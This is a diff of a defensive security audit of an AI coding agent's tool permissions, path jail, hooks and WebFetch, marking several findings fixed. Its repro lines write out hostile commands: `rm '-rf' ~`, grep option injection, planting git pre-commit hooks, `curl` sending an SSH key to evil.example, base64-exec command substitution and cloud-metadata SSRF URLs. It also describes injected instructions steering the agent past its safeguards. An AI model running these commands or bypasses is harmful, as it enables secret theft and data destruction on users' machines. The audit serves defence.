@@ -4,31 +4,15 @@ Scope: `src/Tools/` (built-ins, Concerns, PathJail, IgnoreRules, McpToolBridge),
 Checkout: master @ `05db616f3`, PHP 8.3.6 CLI, `memory_limit=-1`.
 Repro scripts: `/home/sites/crush-research-repos/_audit-scratch/15c/rNN_*.php`. Every repro runs against `.../15c/root` and never against the real repo.
 
-Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low.
+Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Seven have since been fixed on master (see **Fixed since audit** at the end), so 24 remain: 1 Med-High, 10 Medium, 3 Low-Medium, 10 Low.
 
-> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources describe older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which says `Bash(rm *)` "never matched → Allow"). Both should be corrected. The real defects in the new matcher are narrower. F-P5 covers `$(…)`, backticks and redirection slipping past an allow rule. F-J3 covers path rules missing respellings.
+> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, including the open F-P5 hole. The real defects in the new matcher are narrower. F-P5 covers `$(…)`, backticks and redirection slipping past an allow rule. F-J3 covers path rules missing respellings.
 
 **Relation to the known list (99-synthesis Part II).** Nothing below repeats a known item. Where a finding touches one, the overlap is stated.
 
 ---
 
 ## A. Tool output and encoding
-
-### F-T1 — One non-UTF-8 byte in any tool result kills the turn (Read, Bash, WebFetch, Grep, MCP)
-- **Severity:** High. **Confidence:** Verified-by-repro (`r01_binary.php`).
-- **Where:** `src/Runtime.php:2368-2374` (`settle()` builds `ToolResultMessage` from `$result->content()` with no scrub). `src/Providers/SglangProvider.php:1586-1590` puts `content` straight into the request. `:649` / `:687` send it with Guzzle `'json' => $params`. `src/Tools/BuiltIn/Read.php:246` (`file_get_contents`) and `WebFetch.php` `transferPinned()` both return raw bytes. The WebFetch description promises the body comes back "verbatim".
-- **Excerpt:**
-  ```php
-  return new ToolResultMessage($toolCall->id(), $result->content(), ...);   // Runtime.php:2368
-  ...
-  $response = $this->httpClient->post('chat/completions', ['json' => $params, ...]);  // SglangProvider.php:649
-  ```
-- **Failure:** Read a Latin-1 or Windows-1252 file (common in legacy PHP, `.po` files and CSVs), any binary file, or a web page served as ISO-8859-1. Guzzle's `Utils::jsonEncode` throws `json_encode error: Malformed UTF-8 characters`, and the provider rethrows it as `RuntimeException('SGLANG request failed: …')`. The turn dies. Repro output:
-  `RuntimeException: SGLANG request failed: json_encode error: Malformed UTF-8 characters, possibly incorrectly encoded`.
-  Any hostile page can do this on purpose: one `\xff` byte in a WebFetch body ends the agent's turn every time it is fetched. That is a cheap denial-of-service against the agent and needs no permissions. The model also cannot read any non-UTF-8 file at all, because every attempt aborts the turn instead of returning an error it could react to.
-- **Fix:** Normalise once, at the single choke point, `Runtime::settle()` (and `Chat`'s twin), before the `ToolResultMessage` is built. Use `mb_scrub($content, 'UTF-8')`, or, for content that is mostly non-UTF-8, `mb_convert_encoding(..., 'UTF-8', 'UTF-8')` plus a `[binary file: N bytes, not shown]` short-circuit when the NUL or control-byte ratio is high (do this in Read/WebFetch). Also encode with `JSON_INVALID_UTF8_SUBSTITUTE` in providers as a backstop.
-- **Where the fix must go (lead resolved).** `tests/Providers/SglangProviderRequestBuildingTest.php:448-462` (`testUnencodableArrayJsonSchemaSurfacesAnErrorAtTheCallSite`) deliberately pins the throw, but only for a **caller-supplied `jsonSchema`**: a broken schema must fail loudly rather than ship. A provider-wide `JSON_INVALID_UTF8_SUBSTITUTE` would break that contract, so the provider backstop above should be dropped. The fix belongs at the source, which is the pattern `src/Context/EnvironmentBlock.php:845-880` already uses for the same Guzzle throw: repair at the producer, and *announce* the repair ("WHY HERE AND NOT IN THE PROVIDERS"). Scrub in `Runtime::settle()` and append a note such as `[N invalid UTF-8 sequences replaced]`. The dormant Chat tool path already passes `JSON_INVALID_UTF8_SUBSTITUTE` on its IPC (`Chat.php:4679`), so it does not have this bug. The engine path uses `serialize()` IPC (`Runtime.php:2404`), which preserves the bad bytes.
-- **Test:** Write `"caf\xe9\n"` to a temp root. Run Read. Feed the result through `Runtime::settle()` and then `SglangProvider::complete()` with a `MockHandler`. Assert no throw, and that the request body is valid UTF-8 containing U+FFFD and the repair note. Add a sibling test for WebFetch with a stubbed `\xff` body. Leave the jsonSchema throw test as it is.
 
 ### F-T2 — Edit ignores its own `$maxBytes`; a large file costs about 18× its size in RAM
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r06_edit_big.php`).
@@ -61,7 +45,7 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
   ...
   if (preg_match($rule['regex'], $scoped) === 1) { // verdict(): false (error) == no match
   ```
-- **Repro:** A `.gitignore` of 20 identical lines `**a**a**a**a**a**a**a**a**a**a**a**a**a**a**c` (about 900 bytes), and 2,000 empty files named `c` + 40×`a` + N. A single `ignores()` call took 0.094 s and ended with `Backtrack limit exhausted`. **`Glob '**/*'` took 138.97 s.** Grep over the same tree took 0.03 s, because it filters only grep's hits. A cloned repository supplies both the `.gitignore` and the files, so the model's first Glob in that repo runs past the 120 s turn deadline (known #7 covers the deadline; this is a new way to reach it, and Glob, unlike Bash, is not the model's choice to make slow). PCRE's backtrack limit makes each match fail instead of hang. That keeps the cost bounded per call, but the result is a **fail-open verdict**: a rule that errors is treated as not matching, so a negation (`!keep.me`) or a hide rule quietly stops applying. Ignore rules are not a security boundary, but F-J2 shows that `.env` relies on them in practice.
+- **Repro:** A `.gitignore` of 20 identical lines `**a**a**a**a**a**a**a**a**a**a**a**a**a**a**c` (about 900 bytes), and 2,000 empty files named `c` + 40×`a` + N. A single `ignores()` call took 0.094 s and ended with `Backtrack limit exhausted`. **`Glob '**/*'` took 138.97 s.** Grep over the same tree took 0.03 s, because it filters only grep's hits. A cloned repository supplies both the `.gitignore` and the files, so the model's first Glob in that repo runs past the 120 s turn deadline (known #7 covers the deadline; this is a new way to reach it, and Glob, unlike Bash, is not the model's choice to make slow). PCRE's backtrack limit makes each match fail instead of hang. That keeps the cost bounded per call, but the result is a **fail-open verdict**: a rule that errors is treated as not matching, so a negation (`!keep.me`) or a hide rule quietly stops applying. Ignore rules are not a security boundary, but before the F-J2 fix the `.env` guard relied on them in practice.
 - **Fix:** Collapse runs of `*`/`**` while compiling (`**a**a` has the same meaning as a single wildcard sequence, and git's own `wildmatch` is linear). Use possessive or atomic groups (`(?>.*)` is wrong for globs, so use a hand-written glob matcher like git's), or cap the number of wildcards per line (git has an implicit cap). Treat `preg_match() === false` as **match** for hide rules (fail closed) and log the rule once. Cache verdicts per directory prefix so that N files do not re-test the same parent N times.
 - **Test:** The repro as a PHPUnit test with a time budget: Glob over 2,000 files under the hostile `.gitignore` must finish in under 2 s. Add a unit test showing that a rule which hits the backtrack limit still hides its target.
 
@@ -83,45 +67,12 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ## B. Path jail and file-protection bypasses
 
-### F-J1 — Grep option injection: a pattern like `-Re…` makes grep follow symlinks out of the jail
-- **Severity:** High. **Confidence:** Verified-by-repro (`r03_grep_optinj.php`).
-- **Where:** `src/Tools/BuiltIn/Grep.php` (execute): `$cmd .= ' ' . escapeshellarg($pattern) . ' ' . escapeshellarg($path);`. There is no `--` and no `-e` before the pattern.
-- **Excerpt:**
-  ```php
-  $cmd = 'grep -rn';
-  $cmd .= $rules->grepExcludeFlags();
-  ...
-  $cmd .= ' ' . escapeshellarg($pattern) . ' ' . escapeshellarg($path);
-  ```
-- **Exploit:** `escapeshellarg` stops shell injection but not *option* injection. Pattern `-ReSECRET` is parsed by grep as `-R` (dereference **all** symlinks while recursing) plus `-e SECRET`. The repo contains `innocent_link -> ../outside` (git stores symlinks, so a cloned hostile repo can ship `docs -> /home/victim` or `x -> /`). Results:
-  - Normal `Grep pattern=SECRET` → nothing. `Read innocent_link/creds.txt` → "path outside workspace root".
-  - `Grep pattern=-ReSECRET path=.` → `…/root/innocent_link/creds.txt:1:SECRET_TOKEN=hunter2`.
-
-  Grep is classed read-only (Allow in `default`/`plan`/`dont-ask`) and is ParallelSafe, so this reads anything the user can read in every mode, including where Bash is denied. Other options are reachable the same way (`--devices=read`, `-f FILE`, and so on).
-- **Fix:** `grep -rn … -e <pattern> -- <path>` (or `--regexp=`). Add `--no-dereference-recursive` semantics explicitly (`-r` already does this, but the fix is to stop option parsing). The same review applies to any future rg path.
-- **Test:** A fixture with an out-of-root symlink, then Grep with patterns `-Re.`, `-R`, `--dereference-recursive`. Assert there are no hits outside the root. Also assert a literal pattern `-foo` *matches* the text `-foo` in a file.
-
-### F-J2 — The `.env` / `.git/config` secret guard is bypassed by Grep and by trivial Bash spellings
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r07_env_grep.php`).
-- **Where:** `src/Hooks/BuiltIn/ProtectFilesHook.php:130` has matcher `^(Bash|Edit|Write|Read)$`, so Grep, Glob, Lsp and MCP are never checked. `:49` pattern `/(^|[\s\/])\.env(\s|$)/` requires whitespace or end-of-string after the name.
-- **Repro results (full built-in chain):** `Read .env` → deny, `Bash cat .env` → deny, **`Bash cat .env;true` → allow**, **`Bash cat ".env"` → allow**, **`Grep pattern== path=. include_ignored:true` → allow**, and its output is `…/root/.env:1:DB_PASSWORD=s3cr3t`. (`grep -r` searches dotfiles. The `.gitignore` filter only hides the hit until `include_ignored:true`.)
-- **Docs contradiction:** `PERMISSIONS.md` "The hooks that outrank the gate" says `.env` is refused for "Read, Edit, Write, Bash — reading it *is* the leak". The doc never mentions Grep, which is the easiest route, and the Bash half falls to a semicolon or quotes. `.env.local` and `.env.production` are not covered at all.
-- **Fix:** (1) Extend the matcher to `Grep|Glob|Lsp` and screen Grep *output* paths (or pass `--exclude=.env* --exclude-dir=.git` to grep). (2) Loosen the Bash regex boundary to `(?![\w.-])` as the WRITE_ONLY patterns already do, and strip quotes before matching. (3) Cover `.env.*`.
-- **Test:** A table test through `HookManager::preToolUse` with the cases above. Add a Grep integration test asserting `.env` contents never appear even with `include_ignored:true`.
-
 ### F-J3 — Path-scoped deny rules miss relative or absolute respellings and symlinks
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
 - **Where:** `src/Permissions/PermissionRule.php` `matchesPathSubject()` / `normalisePath()`. Normalisation is lexical only and never anchored to the workspace root. For a pattern starting with `/`, suffix matching is skipped.
 - **Failure:** With rule `Read(/proj/secret.txt)` deny, the call `/proj/secret.txt` → Deny, but **`secret.txt` → Allow** and **`./secret.txt` → Allow**. The tools resolve relative paths against `--root`, so all three name the same file. A symlink `notes -> secret.txt` also passes any path deny rule, because realpath is never consulted.
 - **Fix:** Before matching, resolve the subject the way the tool will, with `PathJail::resolve($root, $subject)` (the gate needs the root). Match deny rules against both the raw spelling and the resolved spelling, which mirrors what `ProtectFilesHook::pathSpellings()` already does.
 - **Test:** A deny rule with an absolute pattern, then calls with a relative, `./`, `sub/../`, and symlink spelling. All must Deny.
-
-### F-J4 — `.git/hooks/*` is unprotected; `accept-edits` auto-runs `cp ./x ./.git/hooks/pre-commit`
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r09_accept.php`).
-- **Where:** `ProtectFilesHook::DEFAULT_PROTECTED_PATTERNS` guards `.git/config` but not `.git/hooks/`. `PermissionGate::isScopedWriteTool()` treats any contained relative path as a safe scoped write.
-- **Failure:** Under `accept-edits`, `Bash cp ./payload.sh ./.git/hooks/pre-commit` → **Allow**, with no prompt. That plants code which runs on the user's next `git commit`, *outside* any sugar-crush session or mode: persistence and privilege escalation from one injected instruction. (`.mcp.json` and `.sugar-crush/settings.json` are also auto-allowed this way, but those are already known as #9.) Under bypass and auto (F-P3), `Write .git/hooks/pre-commit` is allowed too.
-- **Fix:** Add `#(^|/)\.git/(hooks/|info/|config\b)#` (plus `.gitattributes`/`.gitmodules` filters if desired) to the WRITE_ONLY patterns. In `isScopedWriteTool`, refuse any path with a `.git` segment.
-- **Test:** Gate table test where `accept-edits` + `cp ./x ./.git/hooks/pre-commit` gives `Ask`. Add a hook test where `Write file_path=.git/hooks/pre-commit` → deny in every mode.
 
 ### F-J5 — BashEscapeDenyHook is unwired, trivially bypassed, and denies `> /dev/null`
 - **Severity:** Low (dormant). **Confidence:** Verified-by-repro (`r14_escape.php`) plus reading.
@@ -136,37 +87,10 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ## C. Permission gate and modes
 
-### F-P1 — The quoted-flag `rm` bypasses both the step-0 "self-destruct" breaker and ConfirmRemoveHook
-- **Severity:** High. **Confidence:** Verified-by-repro (`r08_gate.php`, decisions only; nothing was executed).
-- **Where:** `src/Permissions/PermissionGate.php` `segmentIsRmRfRootOrHome()`: flags are recognised only when `str_starts_with($token, '-')`, and only the **first** non-flag token is checked as the target. `src/Hooks/BuiltIn/ConfirmRemoveHook.php:30-40` requires `\s-` directly before the flag.
-- **Repro, `bypass-permissions` (the shipped default) with the full built-in chain:**
-  - `rm '-rf' ~` → **allow**
-  - `rm "-rf" /` → **allow**
-  - `find . '-delete'` → **allow**
-
-  The breaker alone, in bypass mode: `rm -rf ./x /` → **Allow** (only the first target is checked), `rm -rf /*` → Allow, `rm -rf ~/` → Allow, `rm -rf $HOME` → Allow. ConfirmRemoveHook catches the unquoted forms, but the quoted-flag forms pass **both** layers. bash strips the quotes, so `rm '-rf' ~` deletes `$HOME`, because GNU `--preserve-root` protects only `/`.
-- **Docs contradiction:** `PERMISSIONS.md` §"The six modes" says step 0 means "no allow rule and no mode … can talk the gate into a self-destruct" and lists tolerance for "a quoted target". It does not handle a quoted *flag*, a second target, `/*`, `~/` or `$HOME`.
-- **Fix:** Tokenise with the quote-aware `tokenizeSingleCommand()`-style scanner that already exists in the class, which strips quotes. Check **every** operand. Normalise targets: `~`, `~/`, `$HOME`, `${HOME}`, `/`, `/*`, `/.` and `//` all resolve to root or home. Apply the same unquoting in ConfirmRemoveHook.
-- **Test:** A data provider over the strings above, each asserting `Deny` through `PermissionGate::evaluate()` *and* through the full `HookManager` chain.
-
-### F-P2 — Plan mode's "no writes via Bash" check misses `>f`, `2> f`, `>|`, and every non-redirect write
-- **Severity:** High. **Confidence:** Verified-by-repro (`r08_gate.php`).
-- **Where:** `PermissionGate::isBashWriteCommand()`:
-  ```php
-  return (bool) preg_match('/\s+>\s+/', $cmd)
-      || (bool) preg_match('/\s+>>\s+/', $cmd)
-      || (bool) preg_match('/\|\s*tee(\s+|$)/', $cmd);
-  ```
-- **Repro (plan mode):** `echo x > f` → Deny. **Allow:** `echo x >f`, `echo x>f`, `echo x 2> f`, `cat a >| f`, `sed -i s/a/b/ src.php`, `git commit -am wip`, `git push --force`, `rm src/main.php`, `mv src /tmp/`, `curl -o f …`, `cp /dev/null README.md`, `python3 -c "open('f','w')"`, `truncate -s0 f`.
-- **Why it matters even with known #1:** In the TUI an Ask becomes a deny, but plan-mode **Bash is an Allow**, so this path is live. Plan mode is the mode a user picks to *guarantee* no changes, and a single injected `sed -i` or `git push --force` runs unprompted. `PERMISSIONS.md` claims "`echo x > f` is denied"; the space-free spelling is not.
-- **What the code admits:** `src/Permissions/PermissionMode.php` `description()` for Plan does say "any shell command that does not redirect output runs — a destructive `rm` and an outbound `curl` included, so this is not a dry run" (pinned by `tests/Permissions/PermissionModeDescriptionTest.php`). So the non-redirect half is a **documented design choice**, and the redirect half (`>f`, `2> f`, `>|`) is a **defect against that same contract**. Both halves contradict what "plan" means in Claude Code and opencode, where it is read-only. `PERMISSIONS.md:124-126` also says plan "deliberately allows exploratory `Bash`". The severity stays High because of what plan mode can do to a user who never read either sentence: one injected instruction gets unprompted `rm`, `sed -i` and `git push --force`. The redirect check is the only Bash guard plan mode has, and it misses the common spellings.
-- **Fix:** Invert the policy. In plan mode, allow Bash only when a quote-aware tokeniser finds a single command or pipeline of known read-only commands (`ls cat head tail grep rg find(without -delete/-exec) git {status,log,diff,show,blame,branch --list} wc sort …`) with **no** redirection token of any spacing (`>`, `>>`, `>|`, `&>`, `N>`), and otherwise Deny. The class already has the tokeniser.
-- **Test:** The repro list as a data provider: each must be Deny under Plan, and `git log --oneline` / `grep -rn foo src` must stay Allow.
-
 ### F-P3 — `auto` mode classifies only Bash, so Write, Edit, WebFetch and all `mcp__*` calls are always Allow; the classifier also has unescaped `|` regex bugs
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r10_auto.php`).
 - **Where:** `src/Permissions/SafetyClassifier.php` `classify()` returns `null` (meaning safe) for every non-Bash tool. The `live-credentials` patterns `'env\s+|\s*grep\s+SECRET'`, `'…PASSWORD'` and `'…KEY'` use an unescaped `|`, which makes them alternations.
-- **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow, `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
+- **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow (now denied in every mode since F-J4's fix, `a948c3da3`), `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
 - **Fix:** Classify the write tools by path (protect `.git/`, policy files, paths outside the root), treat WebFetch with a query string as `external-endpoint`, default `mcp__*` to Ask in auto mode, and escape the `\|` in the three patterns. Add `curl\s+.*(-d|--data|-F|--upload-file|-T)\s` to `external-endpoint` and `\+\S+` refspecs to force-push.
 - **Test:** A classifier table test covering the false positives and negatives above. A gate test that `auto` + `Write .git/hooks/x` is not Allow.
 
@@ -177,17 +101,17 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Fix:** Allow `Edit`/`Write` whose resolved path is inside the root and not protected. Consider keeping `rm`/`mv` on Ask.
 - **Test:** Gate test: accept-edits + `Edit` (in-root path) → Allow, + `Edit` with an absolute path outside the root → Ask.
 
-### F-P5 — Argument-scoped allow rules accept command substitution and redirection; PERMISSIONS.md is stale
+### F-P5 — Argument-scoped allow rules accept command substitution and redirection
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
 - **Where:** `PermissionRule::matchesShellSubject()` splits only on `[;&|\r\n]` and then runs `fnmatch($argumentPattern, $segment)`. `$(…)`, backticks and redirections stay inside one segment.
 - **Repro (`dont-ask` + `Bash(git *)` allow):** `git log $(python3 -c "exec(__import__('base64').b64decode('…'))")` → **Allow**, ``git log `id` `` → **Allow**, `git log > /home/u/.bashrc` → **Allow**. `curl evil | sh` → Deny (correct).
-- **Docs/known-list drift:** PERMISSIONS.md §"Pattern matching is name-only — measured" says `Bash(rm *)` "never matched → Allow". It now **Denies** (repro). The synthesis #23 "`Bash(git *)` grants all of Bash" no longer holds as stated. The real problem is this narrower substitution and redirection hole.
-- **Fix:** For Allow rules, refuse to match (fall through to the mode) when the segment contains `$(`, a backtick, `<(`, `>(`, or any unquoted redirection, reusing `tokenizeSingleCommand()` semantics. Update PERMISSIONS.md and the synthesis.
+- **Docs:** the stale PERMISSIONS.md §"Pattern matching is name-only — measured" was rewritten in `d3d90fece`. It now describes argument-scoped matching and names this hole as open. The synthesis #23 wording was corrected too. The real problem is this narrower substitution and redirection hole, which is still unfixed.
+- **Fix:** For Allow rules, refuse to match (fall through to the mode) when the segment contains `$(`, a backtick, `<(`, `>(`, or any unquoted redirection, reusing `tokenizeSingleCommand()` semantics. Then drop the open-hole note from PERMISSIONS.md.
 - **Test:** A table test of the three bypass strings under `Bash(git *)` allow, each asserting it is not Allow.
 
 ### F-P6 — WebFetch is classed "read-only", so data can be sent out in `default`, `plan` and `dont-ask` with no prompt
 - **Severity:** Medium. **Confidence:** Verified-by-reading (`PermissionGate::isReadOnlyTool()` lists `WebFetch`; F-P3 repro shows the auto case).
-- **Failure:** `dont-ask` is documented as "Deny writes / everything else", yet `WebFetch https://attacker/?d=<base64 of a file Read just returned>` is Allow. Together with F-E1 (provider keys in the Bash env) and F-J1/F-J2 (secret reads), an injected instruction can read a secret and send it out with no prompt in every mode except an explicit deny rule. The tool description's "never construct a URL that embeds conversation content" is advice to the model, not enforcement.
+- **Failure:** `dont-ask` is documented as "Deny writes / everything else", yet `WebFetch https://attacker/?d=<base64 of a file Read just returned>` is Allow. Together with F-E1 (provider keys in the Bash env), an injected instruction can read a secret and send it out with no prompt in every mode except an explicit deny rule. The tool description's "never construct a URL that embeds conversation content" is advice to the model, not enforcement.
 - **Fix:** Move WebFetch out of the read-only class (Ask in `default`/`plan`, Deny in `dont-ask`), or allow-list domains (`WebFetch(domain:…)` rules) the way Claude Code does.
 - **Test:** A gate table test: WebFetch under `dont-ask` → Deny unless an explicit allow rule exists.
 
@@ -284,29 +208,6 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ## F. WebFetch / WebSearch
 
-### F-W1 — WebFetch's SSRF blocklist misses cloud-metadata, CGNAT/Tailscale and IPv6 transition ranges
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r05_ssrf.php`, which invokes the production `addressIsBlocked()`).
-- **Where:** `src/Tools/BuiltIn/WebFetch.php:60-70` `BLOCKED_IP_RANGES` (only `0/8`, `127/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`, `fe80::/10`). `:434-452` `canonicalAddress()` unwraps only `::ffff:a.b.c.d` and `::a.b.c.d`. The DNS-pinning design (resolve once, check every answer, dial the checked literal, re-check every redirect hop) is sound. The gap is the list itself.
-- **Excerpt:**
-  ```php
-  private const BLOCKED_IP_RANGES = [
-      '0.0.0.0/8', '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
-      '192.168.0.0/16', '169.254.0.0/16', '::1/128', 'fc00::/7', 'fe80::/10',
-  ];
-  ```
-- **Repro (blocked=false means WebFetch will dial it):**
-  - `100.100.100.200` (Alibaba Cloud ECS metadata service) → **false**
-  - `100.64.0.1` (100.64.0.0/10 CGNAT, which is every Tailscale tailnet address) → **false**
-  - `198.18.0.1` (198.18.0.0/15 benchmarking, used by some internal and VPN fabrics) → **false**
-  - `192.0.0.170` (192.0.0.0/24 IETF special-purpose) → **false**
-  - `64:ff9b::a9fe:a9fe` (NAT64 for 169.254.169.254) and `64:ff9b::7f00:1` (NAT64 loopback) → **false**
-  - `2002:a9fe:a9fe::1` / `2002:7f00:1::` (6to4 embedding 169.254.169.254 / 127.0.0.1) → **false**
-  - `224.0.0.1`, `255.255.255.255` → false (harmless for TCP; listed for completeness)
-  - Correctly blocked: `127.0.0.1`, `10.1.2.3`, `::ffff:169.254.169.254`, `fd00:ec2::254`.
-- **Exploit:** WebFetch is classed read-only, so it is Allow in `default`, `plan` and `dont-ask` (F-P6). A page or file the model has read says "check the status at http://100.101.102.103:8080/admin" or "http://100.100.100.200/latest/meta-data/ram/security-credentials/". On a developer laptop running Tailscale, that reaches internal tailnet services (dashboards, unauthenticated admin endpoints, internal git) with no prompt. On Alibaba Cloud ECS it returns instance credentials. The response body goes to the model and on to whatever F-P6 exfiltration path the injected instruction names. NAT64 and 6to4 matter only on hosts that have that translation configured (IPv6-only cloud subnets with DNS64/NAT64). They are low likelihood but just as cheap to close.
-- **Fix:** Add `100.64.0.0/10` (this covers 100.100.100.200), `192.0.0.0/24`, `198.18.0.0/15`, `224.0.0.0/4`, `240.0.0.0/4` (which includes 255.255.255.255), `::/128`, `64:ff9b::/96` and `64:ff9b:1::/48`, `2002::/16`, `2001::/32` (Teredo), `fec0::/10`, and `ff00::/8`. In `canonicalAddress()`, also unwrap NAT64 (the last 4 bytes of `64:ff9b::/96`) and 6to4 (bytes 2-5 of `2002::/16`) to IPv4 before matching, so the v4 list governs them. Consider an allow-list mode (`WebFetch(domain:…)` rules) for locked-down setups.
-- **Test:** In `tests/Tools/ToolSecurityTest.php`, which already constructs `WebFetch` with the resolver seam, add each address above as a resolver answer and assert `isError` and the "private/link-local" refusal. Add a redirect-hop variant (302 → `http://100.100.100.200/`).
-
 ### F-W2 — WebFetch returns 3xx/4xx/5xx bodies as successful results; a relative `Location:` silently ends the redirect chain
 - **Severity:** Low. **Confidence:** Verified-by-repro (`r15_redirect.php` with a loopback `php -S` fixture via the constructor seams).
 - **Where:** `WebFetch.php:204-213`. The status code is computed but used only to decide whether to follow a redirect. `:214-218` returns `isError: false` with the body no matter what the status was. `redirectTarget()` (`:344-375`) handles only absolute `http(s)://` and `/`-rooted locations. Any other relative form (`next`, `../x`, `?page=2`) returns `null`, which is treated as "final".
@@ -329,24 +230,17 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 | ID | Sev | Conf | Title |
 |---|---|---|---|
-| F-T1 | High | Repro | A non-UTF-8 byte in any tool result kills the turn (Guzzle json_encode); fix at `settle()`, not the provider |
-| F-J1 | High | Repro | Grep option injection (`-Re…`) follows symlinks out of the jail |
-| F-P1 | High | Repro | Quoted-flag `rm '-rf' ~` bypasses step-0 breaker and ConfirmRemoveHook; breaker checks the first target only |
-| F-P2 | High | Repro | Plan mode allows `>f`, `2> f`, `sed -i`, `rm`, `git push --force`… (non-redirect half is documented) |
 | F-E2 | Med-High | Repro | Cancel or deadline SIGKILLs the PHP child only; setsid'd bash keeps running; Task sub-agents cascade |
 | F-T2 | Medium | Repro | Edit ignores `$maxBytes`; 35 MB file → 650 MB peak |
 | F-T3 | Medium | Reading | WebFetch 2 MiB raw result (32× Bash cap) |
 | F-T5 | Medium | Repro | Hostile `.gitignore` → Glob 139 s over 2,000 files (turn killed); backtrack errors fail open |
-| F-J2 | Medium | Repro | `.env` guard bypassed by Grep, `cat .env;`, `cat ".env"` |
 | F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks |
-| F-J4 | Medium | Repro | `.git/hooks/*` unprotected; accept-edits auto-allows planting pre-commit |
 | F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs |
 | F-P4 | Medium | Repro | accept-edits: Edit/Write Ask but `rm`/`mv`/`cp` Allow |
-| F-P5 | Medium | Repro | Arg-scoped allow rules accept `$(…)`, backticks, redirects; PERMISSIONS.md stale |
+| F-P5 | Medium | Repro | Arg-scoped allow rules accept `$(…)`, backticks, redirects (PERMISSIONS.md now documents the hole) |
 | F-P6 | Medium | Reading | WebFetch "read-only" → unprompted exfiltration in default/plan/dont-ask |
 | F-E1 | Medium | Repro | Bash and hooks inherit provider API keys; HOOKS.md env table wrong |
 | F-H1 | Medium | Repro | PostToolUse block is a no-op; output delivered, reason dropped |
-| F-W1 | Medium | Repro | WebFetch SSRF blocklist misses 100.64/10 (Tailscale, Alibaba metadata), 198.18/15, NAT64, 6to4 |
 | F-H2 | Low-Med | Reading | Audit log misses all denials; log-line forging; unbounded input |
 | F-H3 | Low-Med | Repro | Hook input JSON escapes `/`, so grep-style deny hooks never fire; encode failure gives `{}` |
 | F-P8 | Low-Med | Repro | Tool output starting `Permission denied:` is reported as a refusal although the command ran |
@@ -402,3 +296,17 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 **Out of scope, pointed elsewhere:** nested `CLAUDE.md`/`AGENTS.md` bodies that Grep/Glob/Edit/Write append to tool results through `InstructionFileLoader` (size and encoding: 15a C3 and 15d-08); MCP stdio env (known #34); `LspClient` internals.
 
 **Repro scripts** (`/home/sites/crush-research-repos/_audit-scratch/15c/`): `r01_binary` (F-T1), `r02_orphan` (F-E2), `r03_grep_optinj` (F-J1), `r04_hook_exit` (exit-code table), `r05_ssrf` (F-W1), `r06_edit_big` (F-T2; the 35 MB `big.txt` fixture has been deleted, and the script recreates it), `r07_env_grep` (F-J2), `r08_gate` (F-P1/F-P2), `r09_accept` (F-P4/F-J4), `r10_auto` (F-P3), `r11_rules` (F-P5/F-J3), `r12_post_block` (F-H1), `r13_hook_env` (F-E1), `r14_escape` (F-J5), `r15_redirect` + `web/router.php` (F-W2; start `php -S 127.0.0.1:8765 web/router.php` first), `r16_gitignore_redos` (F-T5; it builds its own `redos/` fixture, with an optional file count argument), `r17_forged_refusal` (F-P8), `r18_hook_slash` (F-H3). Fixtures: `root/` (latin1.txt, .env, .gitignore, innocent_link→../outside, orphan_marker), `outside/creds.txt`, `fifo/`.
+
+---
+
+## Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.
+
+- **F-T1** A non-UTF-8 byte in any tool result killed the turn — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15a A6). Residual: the command backends still encode without `JSON_INVALID_UTF8_SUBSTITUTE` (15a A22).
+- **F-J1** Grep option injection (`-Re…`) followed symlinks out of the jail — fixed on master in `3673614b1`.
